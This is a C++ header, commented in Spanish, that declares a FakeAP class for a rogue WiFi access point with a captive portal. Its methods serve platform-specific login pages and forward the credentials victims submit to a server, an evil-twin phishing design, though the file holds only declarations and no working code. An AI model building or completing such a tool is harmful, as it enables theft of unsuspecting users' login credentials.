/**
 * @file FakeAPlib.h
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief Define la clase FakeAP para gestionar un punto de acceso falso.
 * 
 * Incluye métodos para inicializar el punto de acceso, manejar solicitudes HTTP,
 * gestionar autenticación y administrar interacciones con la tarjeta SD.
 * 
 * @version 0.6
 * @date 2024-12-08
 * 
 * @copyright Copyright (c) 2024
 * 
 */

#ifndef FAKEAPLIB_LIB
#define FAKEAPLIB_LIB

#include "./include/SDCardManager.h"
#include "./include/WebServerHandler.h"
#include "./include/WifiCaptivePortal.h"
#include "./include/include.h"



class FakeAP
    : public WebServerManager, public CaptivePortalManager
{
    /**
    * @brief Maneja la solicitud de inicio de sesión.
    * 
    * Determina la plataforma de la que proviene el inicio de sesión y
    * solicta la página correspondiente al servidor.
    */
    void handleLogin();


   /**
    * @brief Maneja el evento de envío de credenciales (después del inicio de sesión).
    * 
    * Procesa la información enviada por el cliente y la manda al servidor.
    */
    void handleSubmit();
public:

    FakeAP();

    /**
    * @brief Constructor que permite especificar el puerto para el servidor.
    * @param port Puerto a utilizar.
    */
    FakeAP(const uint8_t& port);

    FakeAP(const FakeAP&) = delete;

    FakeAP operator=(const FakeAP&) = delete;


    /**
    * @brief Inicializa el punto de acceso con un SSID y contraseña dados.
    * @param AP_SSID El nombre de la red WiFi a crear.
    * @param AP_PSW La contraseña para la red WiFi.
    * @return true si la inicialización fue exitosa, false en caso contrario.
    */
    bool initialize(const String &AP_SSID, const String &AP_PSW = "\0", 
                        const String &WIFI_SSID = "\0", const String &WIFI_PSW = "\0");

    /**
     * @brief Imprime el contenido de los archivos de las variables path
     */
    void printFilesContent();

    void checkState();
    
    /**
     * @brief Inicia el servidor del portal cautivo.
     * 
     * Esta función inicializa y arranca el servidor del portal cautivo, que se utiliza
     * para interceptar y redirigir las solicitudes de los clientes a una página web específica.
     */
    void startCaptiveServer();

};

#ifndef FAKEAP_NO_GLOBALS

#endif //FAKEAP_NO_GLOBALS

#endif //FAKEAPLIB_LIB